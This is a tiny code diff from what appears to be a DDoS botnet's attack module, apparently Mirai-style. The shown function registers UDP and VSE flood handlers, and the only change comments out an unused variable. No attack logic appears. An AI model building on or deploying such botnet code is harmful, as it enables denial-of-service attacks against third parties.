@@ -21,7 +21,7 @@ int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
 
 BOOL attack_init(void)
 {
-    int i;
+    //int i;
 
     add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
     add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
